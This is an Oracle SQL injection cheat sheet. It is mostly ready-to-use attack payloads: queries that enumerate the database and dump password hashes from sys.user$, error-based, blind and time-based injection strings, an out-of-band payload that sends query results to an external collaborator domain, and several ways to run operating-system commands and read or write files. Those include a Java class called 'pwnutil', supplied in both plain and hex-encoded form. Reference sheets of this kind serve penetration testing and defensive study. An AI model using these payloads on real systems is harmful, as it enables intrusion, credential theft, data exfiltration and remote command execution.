# oracle sql injection

> oracle sql injection  is a type of security vulnerability that arises when attackers can insert or "inject" malicious sql code into sql queries executed by oracle database. this can occur when user inputs are not properly sanitized or parameterized, allowing attackers to manipulate the query logic. this can lead to unauthorized access, data manipulation, and other severe security implications.


## summary

* [oracle sql default databases](#oracle-sql-default-databases)
* [oracle sql comments](#oracle-sql-comments)
* [oracle sql enumeration](#oracle-sql-enumeration)
* [oracle sql database credentials](#oracle-sql-database-credentials)
* [oracle sql methodology](#oracle-sql-methodology)
    * [oracle sql list databases](#oracle-sql-list-databases)
    * [oracle sql list tables](#oracle-sql-list-tables)
    * [oracle sql list columns](#oracle-sql-list-columns)
* [oracle sql error based](#oracle-sql-error-based)
* [oracle sql blind](#oracle-sql-blind)
    * [oracle blind with substring equivalent](#oracle-blind-with-substring-equivalent)
* [oracle sql time based](#oracle-sql-time-based)
* [oracle sql out of band](#oracle-sql-out-of-band)
* [oracle sql command execution](#oracle-sql-command-execution)
    * [oracle java execution](#oracle-java-execution)
    * [oracle java class](#oracle-java-class)
* [oraclesql file manipulation](#oraclesql-file-manipulation)
    * [oraclesql read file](#oraclesql-read-file)
    * [oraclesql write file](#oraclesql-write-file)
    * [package os_command](#package-os_command)
    * [dbms_scheduler jobs](#dbms_scheduler-jobs)
* [references](#references)


## oracle sql default databases

| name               | description               |
|--------------------|---------------------------|
| system             | available in all versions |
| sysaux             | available in all versions |


## oracle sql comments

| type                | comment |
| ------------------- | ------- |
| single-line comment | `--`    |
| multi-line comment  | `/**/`  |


## oracle sql enumeration

| description   | sql query |
| ------------- | ------------------------------------------------------------ |
| dbms version  | `select user from dual union select * from v$version`        |
| dbms version  | `select banner from v$version where banner like 'oracle%';`  |
| dbms version  | `select banner from v$version where banner like 'tns%';`     |
| dbms version  | `select banner from gv$version where rownum = 1;`            |
| dbms version  | `select version from v$instance;`                            |
| hostname      | `select utl_inaddr.get_host_name from dual;`                 |
| hostname      | `select utl_inaddr.get_host_name('10.0.0.1') from dual;`     |
| hostname      | `select utl_inaddr.get_host_address from dual;`              |
| hostname      | `select host_name from v$instance;`                          |
| database name | `select global_name from global_name;`                       |
| database name | `select name from v$database;`                               |
| database name | `select instance_name from v$instance;`                      |
| database name | `select sys.database_name from dual;`                        |
| database name | `select sys_context('userenv', 'current_schema') from dual;` |


## oracle sql database credentials

| query                                   | description               |
|-----------------------------------------|---------------------------|
| `select username from all_users;`       | available on all versions |
| `select name, password from sys.user$;` | privileged, <= 10g        |
| `select name, spare4 from sys.user$;`   | privileged, <= 11g        |


## oracle sql methodology

### oracle sql list databases

```sql
select distinct owner from all_tables;
select owner from (select distinct(owner) from sys.all_tables)
```

### oracle sql list tables

```sql
select table_name from all_tables;
select owner, table_name from all_tables;
select owner, table_name from all_tab_columns where column_name like '%pass%';
select owner,table_name from sys.all_tables where owner='<dbname>'
```

### oracle sql list columns

```sql
select column_name from all_tab_columns where table_name = 'blah';
select column_name,data_type from sys.all_tab_columns where table_name='<table_name>' and owner='<dbname>'
```


## oracle sql error based

| description           | query          |
| :-------------------- | :------------- |
| invalid http request  | `select utl_inaddr.get_host_name((select banner from v$version where rownum=1)) from dual` |
| ctxsys.drithsx.sn     | `select ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1)) from dual` |
| invalid xpath         | `select ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) from dual` |
| invalid xml           | `select to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" from sys.dual')) from dual` |
| invalid xml           | `select rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') from all_users` |
| sql error             | `select nvl(cast(length(username) as varchar(4000)),chr(32)) from (select username,rownum as limit from sys.all_users) where limit=1))` |
| xdburitype getblob    | `xdburitype((select banner from v$version where banner like 'oracle%')).getblob()` |
| xdburitype getclob    | `xdburitype((select table_name from (select rownum r,table_name from all_tables order by table_name) where r=1)).getclob()` |
| xmltype               | `and 1337=(select upper(xmltype(chr(60)\|\|chr(58)\|\|'~'\|\|(replace(replace(replace(replace((select banner from v$version),' ','_'),'$','(dollar)'),'@','(at)'),'#','(hash)'))\|\|'~'\|\|chr(62))) from dual) -- -` |
| dbms_utility          | `and 1337=dbms_utility.sqlid_to_sqlhash('~'\|\|(select banner from v$version)\|\|'~') -- -` |

when the injection point is inside a string use : `'||payload--`


## oracle sql blind

| description              | query          |
| :----------------------- | :------------- |
| version is 12.2	       | `select count(*) from v$version where banner like 'oracle%12.2%';` |
| subselect is enabled	   | `select 1 from dual where 1=(select 1 from dual)` |
| table log_table exists   | `select 1 from dual where 1=(select 1 from log_table);` |
| column message exists in table log_table | `select count(*) from user_tab_cols where column_name = 'message' and table_name = 'log_table';` |
| first letter of first message is t | `select message from log_table where rownum=1 and message like 't%';` |


### oracle blind with substring equivalent

| function    | example                                   |
| ----------- | ----------------------------------------- | 
| `substr`    | `substr('foobar', <start>, <length>)`     | 


## oracle sql time based

```sql
and [randnum]=dbms_pipe.receive_message('[randstr]',[sleeptime]) 
and 1337=(case when (1=1) then dbms_pipe.receive_message('randstr',10) else 1337 end)
```


## oracle sql out of band

```sql
select extractvalue(xmltype('<?xml version="1.0" encoding="utf-8"?><!doctype root [ <!entity % remote system "http://'||(select your-query-here)||'.burp-collaborator-subdomain/"> %remote;]>'),'/l') from dual
```


## oracle sql command execution

* [quentinhardy/odat](https://github.com/quentinhardy/odat) - odat (oracle database attacking tool)

### oracle java execution

* list java privileges

    ```sql
    select * from dba_java_policy
    select * from user_java_policy
    ```

* grant privileges

    ```sql
    exec dbms_java.grant_permission('scott', 'sys:java.io.filepermission','<<all files>>','execute');
    exec dbms_java.grant_permission('scott','sys:java.lang.runtimepermission', 'writefiledescriptor', '');
    exec dbms_java.grant_permission('scott','sys:java.lang.runtimepermission', 'readfiledescriptor', '');
    ```

* execute commands
    * 10g r2, 11g r1 and r2: `dbms_java_test.funcall()`

        ```sql
        select dbms_java_test.funcall('oracle/aurora/util/wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') from dual
        select dbms_java_test.funcall('oracle/aurora/util/wrapper','main','/bin/bash','-c','/bin/ls>/tmp/out2.lst') from dual
        ```

    * 11g r1 and r2: `dbms_java.runjava()`

        ```sql
        select dbms_java.runjava('oracle/aurora/util/wrapper /bin/bash -c /bin/ls>/tmp/out.lst') from dual
        ```


### oracle java class

* create java class

    ```sql
    begin
    execute immediate 'create or replace and compile java source named "pwnutil" as import java.io.*; public class pwnutil{ public static string runcmd(string args){ try{ bufferedreader myreader = new bufferedreader(new inputstreamreader(runtime.getruntime().exec(args).getinputstream()));string stemp, str = "";while ((stemp = myreader.readline()) != null) str += stemp + "\n";myreader.close();return str;} catch (exception e){ return e.tostring();}} public static string readfile(string filename){ try{ bufferedreader myreader = new bufferedreader(new filereader(filename));string stemp, str = "";while((stemp = myreader.readline()) != null) str += stemp + "\n";myreader.close();return str;} catch (exception e){ return e.tostring();}}};';
    end;

    begin
    execute immediate 'create or replace function pwnutilfunc(p_cmd in varchar2) return varchar2 as language java name ''pwnutil.runcmd(java.lang.string) return string'';';
    end;

    -- hex encoded payload
    select to_char(dbms_xmlquery.getxml('declare pragma autonomous_transaction; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
    execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results from dual
    ```

* run os command

    ```sql
    select pwnutilfunc('ping -c 4 localhost') from dual;
    ``` 


### package os_command

```sql
select os_command.exec_clob('<command>') cmd from dual
```

### dbms_scheduler jobs

```sql
dbms_scheduler.create_job (job_name => 'exec', job_type => 'executable', job_action => '<command>', enabled => true)
```


## oraclesql file manipulation

:warning: only in a stacked query.

### oraclesql read file

```sql
utl_file.get_line(utl_file.fopen('/path/to/','file','r'), <buffer>)
```

### oraclesql write file

```sql
utl_file.put_line(utl_file.fopen('/path/to/','file','r'), <buffer>)
```



## references

- [asdc12 - new and improved hacking oracle from web - sumit “sid” siddharth - november 8, 2021](https://web.archive.org/web/20211108150011/https://owasp.org/www-pdf-archive/asdc12-new_and_improved_hacking_oracle_from_web.pdf)
- [error based injection | netspi sql injection wiki - netspi - february 15, 2021](https://sqlwiki.netspi.com/injectiontypes/errorbased/#oracle)
- [odat: oracle database attacking tool - quentinhardy - march 24, 2016](https://github.com/quentinhardy/odat/wiki/privesc)
- [oracle sql injection cheat sheet - @pentestmonkey - august 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
- [pentesting oracle tns listener - hacktricks - july 19, 2024](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
- [the sql injection knowledge base - roberto salgado - may 29, 2013](https://www.websec.ca/kb/sql_injection#oracle_default_databases)